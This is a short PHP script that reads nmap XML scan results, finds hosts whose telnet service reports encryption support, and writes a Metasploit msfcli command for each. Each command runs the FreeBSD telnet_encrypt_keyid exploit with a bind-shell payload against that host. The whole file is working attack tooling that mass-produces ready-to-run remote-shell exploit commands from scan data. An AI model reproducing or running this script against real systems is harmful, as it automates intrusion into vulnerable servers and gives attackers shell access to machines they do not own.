<?php
/**
 * @author sk
 */
define(SEARCH_STRING, 'Telnet server supports encryption');
define(MSF_STRING,    "/metasploit3/bin/msfcli exploit/freebsd/telnet/telnet_encrypt_keyid RHOST=%s PAYLOAD=bsd/x86/shell/bind_tcp E\n");

$args       = getopt("f:o:");
$inputFile  = $args['f'];
$outputFile = $args['o'];

if (count($args) != 2) {
    printf("[-] Usage: parseNmap -f <inputFile.xml> -o <outputfile>\n");
    exit();
}

if (!file_exists($inputFile)) {
    printf("[-] Cannot find file!\n");
    exit();
}

printf("[+] Parsing: %s\n", $inputFile);
$xml   = new SimpleXMLElement(file_get_contents($inputFile));
$hosts = $xml->xpath('/nmaprun/host');
$i     = 0;

foreach($hosts as $k => $v) {
    $ip  = (array) $v->xpath('address[1]/@addr');
    $out = (array) $v->xpath('ports/port/script/@output');

    if (SEARCH_STRING == trim($out[0]['output'])) {
        $cmdStr = sprintf(MSF_STRING, $ip[0]);
        file_put_contents($outputFile, $cmdStr, FILE_APPEND);
        ++$i;
    }
}

printf("[+] %s attack strings written to file\n", $i);